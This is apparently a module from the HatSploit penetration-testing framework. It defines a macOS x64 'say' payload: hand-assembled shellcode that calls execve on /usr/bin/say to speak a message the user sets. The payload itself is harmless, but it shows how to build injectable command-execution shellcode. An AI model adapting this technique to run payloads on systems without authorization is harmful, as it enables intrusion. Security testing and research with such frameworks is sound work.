"""
This payload requires HatSploit: https://hatsploit.com
Current source: https://github.com/EntySec/HatSploit
"""

import struct

from hatsploit.lib.core.payload.basic import *
from hatsploit.lib.core.payload.macos import MacOS


class HatSploitPayload(Payload, MacOS):
    def __init__(self):
        super().__init__({
            'Name': "macOS x64 Say",
            'Payload': "macos/x64/say",
            'Authors': [
                'Ivan Nikolskiy (enty8080) - payload developer',
            ],
            'Description': "Say payload for macOS x64.",
            'Arch': ARCH_X64,
            'Platform': OS_MACOS,
            'Type': ONE_SIDE,
        })

        self.message = Option('MSG', "Hello, HatSploit!", "Message to say.", True)

    def run(self):
        data = (
                b'\xe8'
                + struct.pack("<I", len(self.message.value.encode() + b'\x00') + 0xD)
                + b'/usr/bin/say\x00'
                + self.message.value.encode()
                + b'\x00'
        )

        return (
            self.assemble(
                """
                start:
                    xor rax, rax
                    mov eax, 0x200003b
                """,
            ) + data + self.assemble(
                """
                end:
                    mov rdi, [rsp]
                    lea r10, [rdi+0xd]
                    xor rdx, rdx
                    push rdx
                    push r10
                    push rdi
                    mov rsi, rsp
                    syscall
                """,
            )
        )
